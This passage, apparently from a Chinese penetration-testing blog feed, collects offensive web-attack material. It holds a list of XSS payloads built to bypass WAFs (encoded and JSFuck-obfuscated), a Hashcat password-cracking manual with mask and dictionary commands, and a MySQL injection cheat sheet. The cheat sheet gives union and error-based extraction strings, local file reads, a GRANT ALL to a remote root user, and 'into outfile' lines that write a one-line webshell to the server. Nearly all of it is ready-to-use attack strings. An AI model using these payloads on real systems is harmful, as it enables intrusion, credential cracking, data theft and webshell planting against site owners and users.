</code></pre><p>7、</p>
<pre><code>&lt;iframe/onload=alert(1)&gt;
</code></pre><p>8、</p>
<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
</code></pre><p>9、一些有趣的XSS Vector</p>
<pre><code>http://zone.wooyun.org/content/15121
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
            <tag> WAF绕过 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HashCat使用手册]]></title>
      <url>/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
      <content type="html"><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>Hashcat是一个已经有贴近完美的工作工具，支持像“PasswordsPro”，“约翰开膛手”基于规则的攻击。然而，对于一些未知的原因，他们两个不支持多线程。这是写Hashcat的唯一理由：为了利用现代CPU的多个核心。</p>
<a id="more"></a>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>Hashcat有两个主要的变种：</p>
<ul>
<li>1.Hashcat  基于CPU的密码恢复工具</li>
<li>2.oclHashcat/cudaHashcat  一个GPU加速工具</li>
</ul>
<p>许多由Hashcat支持的算法可以在更短的时间，通过使用证据充分的GPU加速被破解在oclHashcat（如MD5，SHA1，等等）利用。然而，并非所有的算法可以通过利用GPU的加速。Bcrypt就是一个很好的例子。由于种种因素，比如依赖于数据的分支，序列化和内存（以仅举几例），oclHashcat不是一个包罗万象的替代Hashcat。<br>使用的话，低版本提示版本过低的话，改一下时间就行了）<br>使用Hashcat没有任何限制，使用oclhashcat则必须满足AMD（的OpenCL）和Nvidia（CUDA）。</p>
<h1 id="0x02-特性"><a href="#0x02-特性" class="headerlink" title="0x02 特性"></a>0x02 特性</h1><ul>
<li>Hashcat可用于Linux，OSX和Windows。oclHashcat仅适用于Linux和Windows</li>
<li>世界最快的密码破解</li>
<li>世界第一个也是唯一基于GPU规则引擎</li>
<li>自由</li>
<li>开源</li>
<li>多GPU（高达128 GPU）的</li>
<li>多散列（高达1亿散列）</li>
<li>多操作系统（Linux和Windows本地二进制文件）</li>
<li>多平台（OpenCL和CUDA支持）</li>
<li>多算法中（见下文）</li>
<li>资源利用率低，你仍然可以看电影或玩游戏而破裂</li>
<li>高度集中迭代现代哈希</li>
<li>基于重点字典攻击</li>
<li>支持分布式开裂</li>
<li>支持暂停 / 恢复而开裂</li>
<li>支持会话</li>
<li>支持恢复</li>
<li>支持读取单词文件</li>
<li>支持读取字标准输入</li>
<li>支持六角盐</li>
<li>支持十六进制字符集</li>
<li>内置基准系统</li>
<li>综合热看门狗</li>
<li>150+算法在考虑性能的实现</li>
</ul>
<h1 id="0x04-使用说明"><a href="#0x04-使用说明" class="headerlink" title="0x04 使用说明"></a>0x04 使用说明</h1><h2 id="破解的hash类型"><a href="#破解的hash类型" class="headerlink" title="破解的hash类型"></a>破解的hash类型</h2><p>使用 –help 查看破解类型</p>
<pre><code>900 = MD4
0 = MD5
5100 = Half MD5
100 = SHA1
10800 = SHA-384
1400 = SHA-256
1700 = SHA-512
5000 = SHA-3(Keccak)
10100 = SipHash
6000 = RipeMD160
6100 = Whirlpool
6900 = GOST R 34.11-94
11700 = GOST R 34.11-2012 (Streebog) 256-bit
11800 = GOST R 34.11-2012 (Streebog) 512-bit
10 = md5($pass.$salt)
20 = md5($salt.$pass)
30 = md5(unicode($pass).$salt)
40 = md5($salt.unicode($pass))
3800 = md5($salt.$pass.$salt)
3710 = md5($salt.md5($pass))
2600 = md5(md5($pass)
4300 = md5(strtoupper(md5($pass)))
4400 = md5(sha1($pass))
110 = sha1($pass.$salt)
120 = sha1($salt.$pass)
130 = sha1(unicode($pass).$salt)
140 = sha1($salt.unicode($pass))
4500 = sha1(sha1($pass)
4700 = sha1(md5($pass))
4900 = sha1($salt.$pass.$salt)
1410 = sha256($pass.$salt)
1420 = sha256($salt.$pass)
1430 = sha256(unicode($pass).$salt)
1440 = sha256($salt.unicode($pass))
1710 = sha512($pass.$salt)
1720 = sha512($salt.$pass)
1730 = sha512(unicode($pass).$salt)
1740 = sha512($salt.unicode($pass))
</code></pre><h2 id="破解方式"><a href="#破解方式" class="headerlink" title="破解方式"></a>破解方式</h2><pre><code>0 = Straight                 #直接字典破解
1 = Combination         #组合破解
2 = Toggle-Case             #切换不同文件破解    
3 = Brute-force             #掩码暴力破解
4 = Permutation         #置换组合破解
5 = Table-Lookup         #查表破解
8 = Prince    
</code></pre><h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><pre><code>General: 
  -m,  --hash-type=NUM              hash类型，引用上文数字
  -a,  --attack-mode=NUM            攻击类型，引用上文数字
  -V,  --version                      版本
  -h,  --help                        帮助文档
--quiet                       Suppress output

Misc:
--hex-salt                                以十六进制给出       
--hex-charset                             以字符集给出    
--runtime=NUM                          运行num时间后终止
--status                                 启用状态
--status-timer=NUM                       定时器
--status-automat                           状态

Built-in charsets:  #自定义字符集
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff

FIile:
  -o，--outfile =文件中定义OUTFILE已恢复哈希
       --outfile格式= NUM定义恢复的散列OUTFILE格式，请参阅下面引用
   --outfile-autohex-Disable禁止使用$ HEX []输出平原
  -p，--separator = CHAR定义hashlists / outfile中分离炭
       --show显示密码破解只（见--username）
       --left只（见--username）显示未开裂的密码
       --username启用hashfile用户名忽略（推荐：也使用--show）
       一旦它被破解--remove启用哈希删除
       --stdout标准输出模式
       --potfile，禁止不写potfile
       --debug模式= NUM（仅适用于通过使用规则的混合）定义调试模式，                                见下面的参考资料
       --debug文件=调试规则文件的输出文件（见--debug模式）
-e，--salt-file =文件盐，文件无盐hashlists

Increment:
      -i,     --increment                   
     --increment-min=NUM           最小值
     --increment-max=NUM           最大值
</code></pre><h1 id="0x05-具体操作"><a href="#0x05-具体操作" class="headerlink" title="0x05 具体操作"></a>0x05 具体操作</h1><h2 id="使用字典进行破解"><a href="#使用字典进行破解" class="headerlink" title="使用字典进行破解"></a>使用字典进行破解</h2><p>使用给的字典和hash进行破解</p>
<pre><code>Hashcat.exe -m 500 example500.hash example.dict
cudaHashcat32.exe -m 500 example500.hash example.dict &gt;result.txt
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/hashcat_1.png" alt=""></p>
<h2 id="使用掩码进行破解"><a href="#使用掩码进行破解" class="headerlink" title="使用掩码进行破解"></a>使用掩码进行破解</h2><pre><code>48E231E66FF8943DB0F6D2B6CB6536D2（xiaoming123456）?l?l?l?l?l?l?l?l?d?d?d?d?d?d
hashcat.exe -m 0 -a 3 
48E231E66FF8943DB0F6D2B6CB6536D2 ?l?l?l?l?l?l?l?l?d?d?d?d?d?d
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/hashcat_2.png" alt=""></p>
<h2 id="HashCat参数优化"><a href="#HashCat参数优化" class="headerlink" title="HashCat参数优化"></a>HashCat参数优化</h2><p>HashCat本身考虑到系统资源的分配，默认参数下并没有最大化的来使用硬件资源。如果我们想要让破解速度最大化，就需要对一些参数进行配置。</p>
<ol>
<li><p>Workload tuning 负载调优。<br>该参数支持的值有1,8,40,80,160</p>
<pre><code>--gpu-accel 160
</code></pre><p>可以让GPU发挥最大性能。</p>
</li>
<li><p>Gpu loops 负载微调<br>该参数支持的值的范围是8-1024（有些算法只支持到1000）。</p>
<pre><code>--gpu-loops 1024
</code></pre><p>可以让GPU发挥最大性能。</p>
</li>
<li><p>Segment size 字典缓存大小<br>该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越好XD。</p>
<pre><code>--segment-size 512
</code></pre><p>可以提高大字典破解的速度。</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> Hashcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS payload]]></title>
      <url>/2016/08/05/XSS-payload/</url>
      <content type="html"><![CDATA[<p>收集的一些比较有用的XSS payload，用于绕过waf及一些应用程序，具体的分类就不说了，一看就明白的。</p>
<a id="more"></a>
<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;

\&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt;

&lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror/=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror=\x00alert(0) /&gt;

&lt;\x00img src=&apos;1&apos; onerror=alert(0) /&gt;

&lt;script\x00&gt;alert(1)&lt;/script&gt;

&lt;i\x00mg src=&apos;1&apos; onerror=alert(0) /&gt;

&lt;img/src=&apos;1&apos;/onerror=alert(0)&gt;

&lt;img\x0bsrc=&apos;1&apos;\x0bonerror=alert(0)&gt;

&lt;img src=&apos;1&apos;&apos;onerror=&apos;alert(0)&apos;&gt;
&lt;img src=&apos;1&apos;&quot;onerror=&quot;alert(0)&quot;&gt;

&lt;img src=&apos;1&apos;\x00onerror=alert(0)&gt;

&lt;img src=&apos;1&apos;onerror=alert(0)&gt;


Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
&lt;iframe src=&quot;\x01javascript:alert(0)&quot;&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt;

&lt;img src=&apos;1&apos; onerror=&apos;alert(0)&apos; &lt;

&lt;&lt;script&gt;alert(0)&lt;/script&gt;

&lt;style&gt;body{background-color:expression\(alert(1))}&lt;/style&gt;

&lt;script&gt;document.write(&apos;&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;&apos;);&lt;/script&gt;

HTML Encoding
&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt;
&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;&lt;/iframe&gt;

URL Encoding
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt;

CSS Hexadecimal Encoding
&lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;Joker&lt;/div&gt;

JavaScript
&lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E&apos;);&lt;/script&gt;

JavaScript
&lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt;
&lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt;

JavaScript
&lt;script&gt;alert(123)&lt;/script&gt;
&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt;

Overlong UTF-8
&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC
&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE
&apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
&quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

&lt;img src=&quot;1&quot; onnerror=&quot;alert(1)&quot;&gt;
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt;
    +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
&lt;script&gt;alert(1)&lt;/script&gt;
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP
&lt;img src=&quot;1&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&gt;
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

and/or Useful features.
HTML 5 (Not comphrensive)
&lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt;
&lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadstart=&quot;alert(1)&quot; /&gt;

Usuage of non-existent elements
&lt;blah style=&quot;blah:expression(alert(1))&quot; /&gt;

CSS Comments
&lt;div style=&quot;z:exp/*anything*/res/*here*/sion(alert(1))&quot; /&gt;

JavaScript functions
&lt;script&gt;window[&apos;alert&apos;](0)&lt;/script&gt;
&lt;script&gt;parent[&apos;alert&apos;](1)&lt;/script&gt;
&lt;script&gt;self[&apos;alert&apos;](2)&lt;/script&gt;
&lt;script&gt;top[&apos;alert&apos;](3)&lt;/script&gt;

JavaScript into HTML
&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt;

&lt;script&gt;
var junk = &apos;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;;
&lt;/script&gt;

HTML CSS
&lt;style&gt;
body { background-image:url(&apos;http://www.blah.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;); }
&lt;/style&gt;

XML documents
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;someElement&gt;
    &lt;a xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;a:body onload=&apos;alert(1)&apos;/&gt;&lt;/a&gt;
&lt;/someElement&gt;

URI Schemes
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; (IE)
&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)
&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&amp;a=val2
ASP.NET     a = val1,val2
ASP         a = val1,val2
JSP         a = val1
PHP         a = val2

&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;
&lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox)

http://target.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1)

&lt;iframe src=&quot;http://target.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;&quot; name=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;

&lt;script&gt;
$=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();
&lt;/script&gt;

&lt;script&gt;
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
&lt;/script&gt;
</code></pre><p>`</p>
]]></content>
      
        
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> XSS </tag>
            
            <tag> WAF绕过 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql注入总结]]></title>
      <url>/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>mysql一般注入(select)，mysql一般注入(insert、update)，mysql报错注入，mysql一般盲注，mysql时间盲注，mysql的一些特性在SQL注入中的利用。</p>
<a id="more"></a>
<h1 id="0x00-mysql一般注入-select"><a href="#0x00-mysql一般注入-select" class="headerlink" title="0x00 mysql一般注入(select)"></a>0x00 mysql一般注入(select)</h1><p>1.注释符:<br>#,/*,--</p>
<p>2.过滤空格注入<br>使用/**/或()或+代替空格</p>
<p>%0c = form feed, new page</p>
<p>%09 = horizontal tab</p>
<p>%0d = carriage return</p>
<p>%0a = line feed, new line</p>
<p>3.多条数据显示</p>
<pre><code>concat()
group_concat()
concat_ws()
</code></pre><p>4.相关函数</p>
<pre><code>system_user() 系统用户名
user() 用户名
current_user 当前用户名
session_user()连接数据库的用户名
database() 数据库名
version() MYSQL数据库版本
load_file() MYSQL读取本地文件的函数
@@datadir 读取数据库路径
@@basedir MYSQL 安装路径
@@version_compile_os 操作系统
GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;
</code></pre><p>5.mysql一般注入语句</p>
<pre><code>猜字段数
order by n#
查看mysql基本信息
and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7#
查询数据库
and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1#
and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata#
查询表名
and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1#
and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码#
查询字段
and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1#
and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码#
查询数据
and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表#
判断是否具有读写权限
and (select count(*) from mysql.user)&gt;0#
读权限
and (select count(file_priv) from mysql.user)&gt;0#
写权限
</code></pre><p>6.mysql读取写入文件</p>
<pre><code>必备条件：
读：file权限必备
写：1.绝对路径 2.union使用 3. 可以使用&apos;&apos;
</code></pre><p>————————-读———————-</p>
<pre><code>mysql3.x读取方法
create table a(命令 文本名);
load data infile &apos;c:\\xxx\\xxx\\xxx.txt&apos; into table a;
select * from a;
mysql4.x读取方法
除上述方法还可以使用load_file()
create table a(命令 文本名);
insert into a(命令) values(load_file(&apos;c:\\ddd\\ddd\\ddd.txt&apos;));
select * from a;
mysql5.x读取方法
上述两种都可以
读取文件技巧：
load_file(char(32,26,56,66))
load_file(0x633A5C626F6F742E696E69)   c:\boot.ini
</code></pre><p>————————-写———————-</p>
<pre><code>into outfile写文件
union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;#
union select 1,2,3,load_file(&apos;d:\web\logo123.jpg&apos;),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;#
</code></pre><h1 id="0x01-mysql一般注入-insert、update"><a href="#0x01-mysql一般注入-insert、update" class="headerlink" title="0x01 mysql一般注入(insert、update)"></a>0x01 mysql一般注入(insert、update)</h1><p>一般情况同上</p>
<p>mysql一般请求mysql_query不支持多语句执行，mysqli可以。</p>
<p>insert注入多使用报错注入!</p>
<pre><code>1.如果可以直接插入管理员可以直接使用!
insert into user(username,password) values(&apos;xxxx&apos;,&apos; xxxx&apos;),(&apos;dddd&apos;,&apos;dddd&apos;)/* &apos;);
2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell
</code></pre><p>update注入同上</p>
<h1 id="0x02-mysql报错注入"><a href="#0x02-mysql报错注入" class="headerlink" title="0x02 mysql报错注入"></a>0x02 mysql报错注入</h1><h2 id="1、通过floor暴错"><a href="#1、通过floor暴错" class="headerlink" title="1、通过floor暴错"></a>1、通过floor暴错</h2><p>FLOOR(x)函数用于返回小于或等于x的最大整数值。</p>
<pre><code>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor
(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一
行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。
group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行，不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。
具体原理参考：http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。
</code></pre><p>常用语句：</p>
<pre><code>数据库版本
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
简单办法爆库
?id=info()
爆用户
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆数据库名
?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆库
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆表
?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
爆字段
